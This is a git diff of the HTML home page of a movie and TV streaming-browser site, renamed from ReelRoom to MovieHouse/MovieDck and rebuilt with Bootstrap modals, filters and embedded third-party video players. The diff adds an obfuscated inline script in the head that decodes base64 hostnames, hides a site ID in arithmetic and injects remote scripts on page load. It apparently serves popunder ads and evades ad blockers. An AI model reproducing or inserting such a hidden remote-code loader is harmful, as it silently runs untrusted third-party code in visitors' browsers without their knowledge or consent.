@@ -1,155 +1,185 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>ReelRoom</title>
-  <link rel="stylesheet" href="css/home.css">
-  <link rel="preload" href="css/home.css" as="style">
-  <link rel="preload" href="js/home.js" as="script">
-  <link rel="manifest" href="manifest.json">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-  <script defer src="js/home.js"></script>
-</head>
-
-<body>
-  <div class="navbar">
-    <h1 class="logo-text">REELROOM</h1>
-    <div class="nav-links">
-      <a href="index.html">Home</a>
-      <button class="search-icon-btn" onclick="openSearchModal()">
-        <i class="fas fa-search"></i>
-      </button>
-    </div>
-  </div>
-
-  <div class="banner" id="banner">
-    <div class="slideshow-container">
-      <div class="slides" id="slides"></div>
-      <a class="prev" onclick="changeSlide(-1)">&#10094;</a>
-      <a class="next" onclick="changeSlide(1)">&#10095;</a>
-      <div class="dots" id="dots"></div>
-    </div>
-  </div>
-
-  <div class="row">
-    <h2>
-      <span>Trending Movies</span>
-      <button class="view-all-btn" data-category="movies" onclick="openAllView(this.dataset.category)">VIEW ALL &raquo;</button>
-    </h2>
-    <div class="list" id="movies-list"></div>
-  </div>
-
-  <div class="row">
-    <h2>
-      <span>Trending TV Shows</span>
-      <button class="view-all-btn" data-category="tvshows" onclick="openAllView(this.dataset.category)">VIEW ALL &raquo;</button>
-    </h2>
-    <div class="list" id="tvshows-list"></div>
-  </div>
-
-  <div class="row">
-    <h2>
-      <span>Trending Anime</span>
-      <button class="view-all-btn" data-category="anime" onclick="openAllView(this.dataset.category)">VIEW ALL &raquo;</button>
-    </h2>
-    <div class="list" id="anime-list"></div>
-  </div>
-
-  <div class="row">
-    <h2>
-      <span>Trending Tagalog Movies</span>
-      <button class="view-all-btn" data-category="tagalog-movies" onclick="openAllView(this.dataset.category)">VIEW ALL &raquo;</button>
-    </h2>
-    <div class="list" id="tagalog-movies-list"></div>
-  </div>
-
-  <div class="row">
-    <h2>
-      <span>Trending Netflix Movies</span>
-      <button class="view-all-btn" data-category="netflix-movies" onclick="openAllView(this.dataset.category)">VIEW ALL &raquo;</button>
-    </h2>
-    <div class="list" id="netflix-movies-list"></div>
-  </div>
-
-  <div class="row">
-    <h2>
-      <span>Trending Netflix TV Shows</span>
-      <button class="view-all-btn" data-category="netflix-tv" onclick="openAllView(this.dataset.category)">VIEW ALL &raquo;</button>
-    </h2>
-    <div class="list" id="netflix-tv-list"></div>
-  </div>
-
-  <div class="row">
-    <h2>
-      <span>Trending Korean Drama</span>
-      <button class="view-all-btn" data-category="korean-drama" onclick="openAllView(this.dataset.category)">VIEW ALL &raquo;</button>
-    </h2>
-    <div class="list" id="korean-drama-list"></div>
-  </div>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MovieHouse</title>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@900&family=DM+Serif+Display&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/css/bootstrap.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <link rel="stylesheet" href="style.css"> 
   
-  <div id="empty-message" style="display: none; text-align: center; color: #ccc; padding: 20px;">Loading content...</div>
-
+  <script type="text/javascript" data-cfasync="false">
+/*<![CDATA[/* */
+(function(){var l=window,b="de9c0ec5a7039cf40d6dc0a042c7e442",i=[["siteId",434*901*786*587-180410845774],["minBid",0],["popundersPerIP","1,1"],["delayBetween",20],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],q=["d3d3LmFudGlhZGJsb2Nrc3lzdGVtcy5jb20vd2JhdG1hbi5taW4uY3Nz","ZDNjb2Q4MHRobjdxbmQuY2xvdWRmcm9udC5uZXQvVXJ3L3Zqc3R6Lm1pbi5qcw=="],z=-1,o,y,g=function(){clearTimeout(y);z++;if(q[z]&&!(1779141316000<(new Date).getTime()&&1<z)){o=l.document.createElement("script");o.type="text/javascript";o.async=!0;var n=l.document.getElementsByTagName("script")[0];o.src="https://"+atob(q[z]);o.crossOrigin="anonymous";o.onerror=g;o.onload=function(){clearTimeout(y);l[b.slice(0,16)+b.slice(0,16)]||g()};y=setTimeout(g,5E3);n.parentNode.insertBefore(o,n)}};if(!l[b]){try{Object.freeze(l[b]=i)}catch(e){}g()}})();
+/*]]>/* */
+</script>
+</head>
+<body>
   <div class="modal" id="modal">
-    <div class="modal-content">
-      <span class="close" onclick="closeModal()" style="color: red;">&times;</span>
+    <div class="modal-content" id="modal-content-movie">
+      <span class="close" onclick="closeModal()">×</span>
       <div class="modal-body">
-        <img id="modal-image" src="" alt="" />
+        <img id="modal-image" src="" alt="Poster">
         <div class="modal-text">
           <h2 id="modal-title"></h2>
           <div class="stars" id="modal-rating"></div>
+          <div class="modal-genre" id="modal-genres"></div>
           <p id="modal-description"></p>
+          <div class="modal-cast" id="modal-cast"></div>
+          <div class="modal-crew" id="modal-crew"></div>
+          <div class="modal-trailer" id="modal-trailer"></div>
+          <button class="share-btn" id="share-movie-btn" onclick="shareMovie()">Share</button>
         </div>
       </div>
       <div class="server-selector">
         <label for="server">Change Server:</label>
         <select id="server" onchange="changeServer()">
+          <option value="player.videasy.net" selected>Player.Videasy.net</option>
           <option value="vidsrc.cc">Vidsrc.cc</option>
           <option value="vidsrc.me">Vidsrc.me</option>
-          <option value="player.videasy.net" selected>Vidplayer (player.videasy.net)</option>
         </select>
       </div>
-      <div class="season-selector" id="season-selector" style="display: none;">
-        <label for="season">Select Season:</label>
-        <select id="season" onchange="loadEpisodes()"></select>
+      <div class="iframe-container">
+        <iframe id="modal-video" allowfullscreen autoplay></iframe>
+        <button class="iframe-play-overlay" onclick="triggerIframePlay('modal-video')">
+          <i class="fas fa-play"></i>
+        </button>
       </div>
-      <div class="episode-list" id="episode-list"></div>
-      <iframe id="modal-video" width="100%" height="315" frameborder="0" allowfullscreen></iframe>
+      <div id="similar-movies" style="padding: 1rem 2rem;"></div>
+    </div>
+    <div class="modal-content" id="modal-content-tv" style="display: none;">
+      <span class="close" onclick="closeModal()">×</span>
+      <div class="modal-body">
+        <img id="tv-modal-image" src="" alt="Poster">
+        <div class="modal-text">
+          <h2 id="tv-modal-title"></h2>
+          <div class="modal-genre" id="tv-modal-genres"></div>
+          <p id="tv-modal-description"></p>
+          <div><strong>First Air Date:</strong> <span id="tv-modal-air-date"></span></div>
+          <div><strong>Seasons:</strong> <span id="tv-modal-total-seasons"></span></div>
+          <button class="share-btn" id="share-tv-btn" onclick="shareTvShow()" style="margin-bottom: 1em;">Share</button>
+          <button class="favorite-btn" id="tv-favorite-btn" title="Add to favorites" aria-label="Add to favorites" tabindex="0">
+            <i class="fas fa-heart"></i>
+          </button>
+          <div id="tv-modal-seasons-list"></div>
+        </div>
+      </div>
+      <div class="iframe-container">
+        <iframe id="tv-episode-player" allowfullscreen autoplay style="display: none;"></iframe>
+        <button class="iframe-play-overlay" onclick="triggerIframePlay('tv-episode-player')">
+          <i class="fas fa-play"></i>
+        </button>
+      </div>
+      <div style="display: flex; justify-content: center;">
+        <button class="tv-episode-next-btn" id="tv-episode-next-btn" style="display: none; margin-bottom: 1em;">Next Episode »</button>
+      </div>
     </div>
   </div>
 
-  <div class="search-modal" id="search-modal">
-    <span class="close" onclick="closeSearchModal()" style="color: red;">&times;</span>
-    <input type="text" id="search-input" placeholder="Search for a movie or show..." onkeyup="debouncedSearchTMDB()" />
-    <div class="results" id="search-results"></div>
+  <nav class="navbar navbar-expand-lg">
+    <div class="container-fluid">
+      <a class="navbar-brand d-flex align-items-center" href="index.html">
+        <span class="logo-text">MovieDck</span>
+      </a>
+      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <ul class="navbar-nav ml-auto mb-2 mb-lg-0" id="movie-nav">
+          <li class="nav-item">
+            <a class="nav-link nav-link-1 active" id="nav-movies" href="#" aria-label="Trending Movies">Trending Movies</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" id="nav-tvshows" href="#" aria-label="Trending TV Shows">Trending TV Shows</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link nav-link-2" id="nav-anime" href="#" aria-label="Trending Anime Movies">Trending Anime Movies</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link nav-link-3" id="nav-tagalog" href="#" aria-label="Trending Tagalog Movies">Trending Tagalog Movies</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" id="nav-netflix" href="#" aria-label="Trending Netflix"><i class="fab fa-netflix"></i> Trending Netflix</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" id="nav-favorites" href="#" title="Favorites" aria-label="Favorites"><i class="fas fa-heart"></i> Favorites</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <div class="tm-hero d-flex justify-content-center align-items-center" data-parallax="scroll" data-image-src="">
+    <form class="d-flex tm-search-form" id="movie-search-form" autocomplete="off" style="width: 100%; max-width: 600px; margin: 2em auto;">
+      <input class="form-control tm-search-input" type="search" id="movie-search-input" placeholder="Search for movies or TV shows..." aria-label="Search">
+      <button class="btn btn-outline-success tm-search-btn" type="submit">
+        <i class="fas fa-search"></i>
+      </button>
+    </form>
   </div>
 
-  <div class="all-view-container" id="all-view-container">
-    <span class="back-btn" onclick="closeAllView()">&times;</span>
-    <h2 id="all-view-title"></h2>
-    
-    <div class="all-view-controls">
-      <select id="genre-filter" onchange="filterAllView()">
-        <option value="">All Genres</option>
-      </select>
-      <select id="year-filter" onchange="filterAllView()">
-        <option value="">All Years</option>
-      </select>
+  <div class="container-fluid tm-container-content tm-mt-60">
+    <div id="recently-viewed-section" style="display: none;">
+      <h5 style="color: #fff; margin-bottom: 0.7em;">Recently Viewed</h5>
+      <div id="recently-viewed-list"></div>
     </div>
-    
-    <div class="all-view-grid" id="all-view-grid">
-      </div>
-    <p class="loading" id="all-view-loading" style="display: none;">Loading more...</p>
+    <div class="row mb-4">
+      <h2 class="col-6 tm-text-primary" id="section-title">Trending Movies</h2>
+      <div class="col-6 d-flex justify-content-end align-items-center"></div>
+    </div>
+    <div class="row mb-4">
+      <form class="genre-filter-form" id="genre-filter-form">
+        <select id="genre-filter" aria-label="Filter movies by genre" role="listbox" disabled>
+          <option value="" id="genre-all">Loading genres...</option>
+        </select>
+        <select id="year-filter" aria-label="Filter movies by year" role="listbox">
+          <option value="" id="year-all">All Years</option>
+        </select>
+        <button type="button" id="clear-genre-btn" class="btn btn-outline-primary" style="padding: 0.5rem 1rem;">Clear</button>
+      </form>
+    </div>
+    <div class="row tm-mb-90 flex-wrap" id="movie-list" style="margin-left: 0; margin-right: 0;"></div>
+    <div id="infinite-loader" style="display: none;"><div class="spinner"></div><p class="loading-state">Loading more...</p></div>
   </div>
-  <footer class="footer">
-    <div class="footer-content">
-      <p>&copy; 2025 ReelRoom. All rights reserved.</p>
-      <div class="footer-links">
-        <a href="#">Disclaimer</a>
-        <a href="#">About Us</a>
-        <a href="#">Contact Us</a>
+
+  <button id="back-to-top" title="Back to Top" aria-label="Back to Top">
+    <i class="fas fa-arrow-up"></i>
+  </button>
+  <button id="bmc-hover-btn" title="Support us on Buy Me a Coffee" aria-label="Support us on Buy Me a Coffee">
+    <img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me a Coffee" class="bmc-button">
+  </button>
+
+  <footer class="tm-bg-gray pt-5 pb-3 tm-text-gray tm-footer">
+    <div class="container-fluid tm-container-small">
+      <div class="row">
+        <div class="col-lg-6 col-md-12 col-12 px-5 mb-5">
+          <h3 class="tm-text-primary mb-4 tm-footer-title">About MovieDck</h3>
+          <p>MovieDck is a free, open movie & TV show browser using TMDB, supporting favorites and more. Built for education and fun.</p>
+        </div>
+        <div class="col-lg-3 col-md-6 col-sm-6 col-12 px-5 mb-5">
+          <h3 class="tm-text-primary mb-4 tm-footer-title">Quick Links</h3>
+          <ul class="tm-footer-links pl-0">
+            <li><a href="mailto:norwilaxie@gmail.com">Contact</a></li>
+            <li>
+              <a href="https://www.buymeacoffee.com/MovieDckWFPH" target="_blank" rel="noopener" aria-label="Support us on Buy Me a Coffee">
+                <img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me a Coffee" class="bmc-button">
+              </a>
+            </li>
+          </ul>
+        </div>
+        <div class="col-lg-3 col-md-6 col-sm-6 col-12 px-5 mb-5">
+        </div>
+      </div>
+      <div class="row">
+        <div class="col-lg-8 col-md-7 col-12 px-5 mb-3">Copyright 2025 MovieDck Project.</div>
       </div>
     </div>
   </footer>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.1/umd/popper.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/js/bootstrap.min.js"></script>
+  <script src="script.js"></script>
 </body>
 </html>
